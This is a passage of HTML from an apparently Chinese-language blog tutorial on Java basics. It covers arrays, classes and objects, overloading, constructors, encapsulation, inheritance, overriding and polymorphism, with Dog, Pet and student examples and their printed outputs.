class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">sum += nums[i];</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出了add中所有数字的和</span></span><br></pre></td></tr></table></figure><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p><img src="3.jpg" alt="3"></p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p><strong>什么是对象</strong>（面向对象思想）:</p><ul><li>一切客观存在的事物都是对象, <strong>万物皆对象</strong> .</li><li>任何对象,一定具有自己的 <strong>特征</strong> 和 <strong>行为</strong> .</li></ul><p>特征: 称为属性 一般为名字 代表对象有什么<br>行为:成为方法 一般为动词 代表对象能做什么</p><h2 id="程序中的对象"><a href="#程序中的对象" class="headerlink" title="程序中的对象"></a>程序中的对象</h2><p>如何使用程序模拟现实世界,解决现实问题？</p><ul><li>首先, 在程序当中,必须具有和现实中相同的对象,用以模拟现实世界.</li><li>然后，使用程序中的对象代表现实中的对象,并执行操作,进而解决现实问题.</li></ul><p>这里我们举个例子 创建一个名为 <strong>dog</strong> 的类(class) 为它定义特征(属性)和行为(方法)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是Dog.java中的内容 声明了如何调用Dog的特征并使用其中的eat sleep行为</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">String breed;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line">String color;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;在吃东西&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;在睡觉...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 以下是调用Dog类的dogtest.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dogtest</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Dog</span> <span class="variable">mygo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">mygo.breed = <span class="string">&quot;萨摩耶&quot;</span>;</span><br><span class="line">mygo.age = <span class="number">7</span>;</span><br><span class="line">mygo.color = <span class="string">&quot;白&quot;</span>;</span><br><span class="line">mygo.sex = <span class="string">&quot;公&quot;</span>;</span><br><span class="line">System.out.println(mygo.breed+<span class="string">&quot;\t今年&quot;</span>+mygo.age+<span class="string">&quot;岁\t是&quot;</span>+mygo.sex+<span class="string">&quot;狗\t&quot;</span>+mygo.color+<span class="string">&quot;毛&quot;</span>);</span><br><span class="line">mygo.eat();</span><br><span class="line">mygo.sleep();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 声明调用语句: 类名 引用名 = new 类名();</span></span><br><span class="line"><span class="comment">// 调用特征: 引用名.特征名 = 值; 相关数据类型在类里已经有定义</span></span><br><span class="line"><span class="comment">// 调用行为: 引用名.方法名();</span></span><br></pre></td></tr></table></figure><p>当dogtest.java处不给变量赋值的话 会输出默认值<br>int对应0 string对应null double对应0.0 boolean对应false<br><img src="4.jpg" alt="4"><br>默认值是可以改的 我们在dog.java里为变量赋值就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">String breed=<span class="string">&quot;default&quot;</span>;</span><br><span class="line">System.out.println(breed+<span class="string">&quot;在吃东西&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出:</span><br><span class="line"><span class="literal">null</span> 今年<span class="number">0</span>岁 是<span class="literal">null</span>狗 <span class="literal">null</span>毛</span><br><span class="line"><span class="keyword">default</span>在吃东西</span><br><span class="line"><span class="literal">null</span>在睡觉...</span><br><span class="line">这样设置的话会优先使用局部变量 要用实例变量需要在变量前加<span class="built_in">this</span>.</span><br><span class="line">\*/</span><br><span class="line"><span class="comment">// dog.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">String breed=<span class="string">&quot;default&quot;</span>;</span><br><span class="line">System.out.println(<span class="built_in">this</span>.breed+<span class="string">&quot;在吃东西&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dogtest.java</span></span><br><span class="line">mygo.breed = <span class="string">&quot;萨摩耶&quot;</span>;</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">萨摩耶 今年<span class="number">7</span>岁 是公狗 白毛</span><br><span class="line">萨摩耶在吃东西</span><br><span class="line">萨摩耶在睡觉...</span><br></pre></td></tr></table></figure><p>加深印象再举个例子 student</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// student.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">student</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHi</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;--&quot;</span>+age+<span class="string">&quot;--&quot;</span>+sex+<span class="string">&quot;--&quot;</span>+score);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//student5.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">student5</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">student</span> <span class="variable">wow</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">student</span>();</span><br><span class="line">wow.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">wow.age = <span class="number">14</span>;</span><br><span class="line">wow.sex = <span class="string">&quot;男&quot;</span>;</span><br><span class="line">wow.score = <span class="number">99</span>;</span><br><span class="line">wow.sayHi();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">张三--<span class="number">14</span>--男--<span class="number">99</span></span><br></pre></td></tr></table></figure><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>通过多个相同名称的方法实现多个过程——例如实现“吃”的多个分支 吃水果 吃蔬菜 吃药</p><h3 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h3><ul><li>方法名称相同</li><li>参数列表不同（类型、个数、顺序）</li><li>与访问修饰符、返回值类型无关</li></ul><p>好处:灵活 方便</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test6</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">test(<span class="number">1</span>);</span><br><span class="line">test(<span class="string">&quot;烧烤&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;吃吃吃！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name,<span class="type">int</span> b)</span> &#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;也吃吃吃！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">吃吃吃！</span><br><span class="line">烧烤也吃吃吃！</span><br></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>构造方法是类中的特殊方法,主要用于创建对象.</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h3><ul><li>名称与类名完全相同</li><li>没有返回值类型</li><li>创建对象时,触发构造方法的调用,不可通过句点手动调用</li></ul><p>注意:如果没有在类中显式定义构造方法,则编译器默认提供无参构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Person.java代码内容</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="comment">// 无参构造方法</span></span><br><span class="line">Person() &#123;</span><br><span class="line">name = <span class="string">&quot;未命名&quot;</span>;</span><br><span class="line">age = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 带一个参数的构造方法</span></span><br><span class="line">Person(String name) &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">age = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 带两个参数的构造方法</span></span><br><span class="line">Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Main.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line"><span class="type">Person</span> <span class="variable">p3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Charlie&quot;</span>, <span class="number">30</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;p1: &quot;</span> + p1.name + <span class="string">&quot;, &quot;</span> + p1.age);</span><br><span class="line">System.out.println(<span class="string">&quot;p2: &quot;</span> + p2.name + <span class="string">&quot;, &quot;</span> + p2.age);</span><br><span class="line">System.out.println(<span class="string">&quot;p3: &quot;</span> + p3.name + <span class="string">&quot;, &quot;</span> + p3.age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">p1: 未命名, <span class="number">0</span></span><br><span class="line">p2: Bob, <span class="number">0</span></span><br><span class="line">p3: Charlie, <span class="number">30</span></span><br></pre></td></tr></table></figure><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><p><img src="5.jpg" alt="5"><br>加了this之后 谁在调用当前对象 就套用哪个</p><h2 id="面向对象的三大特性-分装-继承-多态"><a href="#面向对象的三大特性-分装-继承-多态" class="headerlink" title="面向对象的三大特性 分装 继承 多态"></a>面向对象的三大特性 分装 继承 多态</h2><h3 id="什么是封装"><a href="#什么是封装" class="headerlink" title="什么是封装"></a>什么是封装</h3><p>概念:尽可能隐藏对象的内部实现细节 控制对象的修改 访问权限<br>访问修饰符: private (可将属性修饰为私有，仅本类可见)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//student.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">student</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">double</span> score;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(age&gt;=<span class="number">0</span> &amp;&amp; age&lt;=<span class="number">160</span>)&#123;</span><br><span class="line"><span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.age = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//student5.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">student5</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">student</span>();</span><br><span class="line">s1.setAge(<span class="number">1000</span>);</span><br><span class="line">System.out.println(s1.getAge());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="number">18</span> <span class="comment">//超出范围时 age将被赋值18</span></span><br></pre></td></tr></table></figure><p>通过设置private属性 外界访问将无法直接给private属性赋值 需要通过公共方法来进行</p><h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>假如说要搞很多类 他们都有很多共同的性质 一个一个定义太麻烦了 可以定义一个父类 关键是在类后边使用extends</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pet.java 中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> health;</span><br><span class="line"><span class="type">int</span> love;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;吃东西呢&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Dog.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123; <span class="comment">//表明内容继承自Pet</span></span><br><span class="line">String breed;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(breed+<span class="string">&quot;在睡觉...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test.java中的内容</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Dog</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">d1.name=<span class="string">&quot;修购&quot;</span>;</span><br><span class="line">d1.health=<span class="number">99</span>;</span><br><span class="line">d1.love=<span class="number">132</span>;</span><br><span class="line">d1.breed=<span class="string">&quot;哈士奇&quot;</span>;</span><br><span class="line">d1.sleep();</span><br><span class="line">d1.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">哈士奇在睡觉...</span><br><span class="line">修购-<span class="number">99</span>-<span class="number">132</span></span><br></pre></td></tr></table></figure><p><img src="6.jpg" alt="6"><br>super和this差不多 都是在变量前边加 能够提高优先级<br><img src="7.jpg" alt="7"></p><h2 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h2><p>有的时候父类里定义的方法并没有写的很全 需要再加一些 就可以再进行重写<br>1.重写时访问修饰符的等级必须相等或是放大(父类中方法为protected 子类重写时只能改为protected或public ) 改小会报错<br>2.返回值类型可以和父类一致，也可以是父类返回类型的子类<br>3.方法名必须完全一样<br>4.参数也要注意 不然不是重写而是重载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类Pet.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> health;</span><br><span class="line"><span class="type">int</span> love;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;吃东西呢&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类Dog.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">String breed;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+breed+<span class="string">&quot;在睡觉...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Dog</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">d1.name=<span class="string">&quot;修购&quot;</span>;</span><br><span class="line">d1.health=<span class="number">99</span>;</span><br><span class="line">d1.love=<span class="number">132</span>;</span><br><span class="line">d1.breed=<span class="string">&quot;哈士奇&quot;</span>;</span><br><span class="line">d1.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">修购哈士奇在睡觉...</span><br><span class="line">输出的规则参照了Dog.java而不是Pet.java 说明成功重写</span><br></pre></td></tr></table></figure><h2 id="继承下的构造执行"><a href="#继承下的构造执行" class="headerlink" title="继承下的构造执行"></a>继承下的构造执行</h2><ul><li>在具有继承关系的对象创建中,构建子类对象会先调用父类构造.</li><li>由父类的共性内容,叠加子类的都有内容,组合成完整的子类对象.</li></ul><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>指的是父类引用指向子类对象 从而产生多种形态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类Pet.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> health;</span><br><span class="line"><span class="type">int</span> love;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(name + <span class="string">&quot;在跳舞&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类Dog.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(name + <span class="string">&quot;在睡觉...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类Cat.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(name + <span class="string">&quot;在喵喵叫...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="comment">// 通过形参实现多态的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">letPetPerform</span><span class="params">(Pet pet)</span> &#123;</span><br><span class="line">pet.show(); <span class="comment">// 调用实际对象的 show 方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Pet</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.name = <span class="string">&quot;修购&quot;</span>;</span><br><span class="line">dog.health = <span class="number">99</span>;</span><br><span class="line">dog.love = <span class="number">132</span>;</span><br><span class="line"><span class="type">Pet</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">cat.name = <span class="string">&quot;咪咪&quot;</span>;</span><br><span class="line">cat.health = <span class="number">95</span>;</span><br><span class="line">cat.love = <span class="number">120</span>;</span><br><span class="line"><span class="comment">// 使用形参多态</span></span><br><span class="line">letPetPerform(dog); <span class="comment">// 输出: 修购在睡觉...</span></span><br><span class="line">letPetPerform(cat); <span class="comment">// 输出: 咪咪在喵喵叫...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" 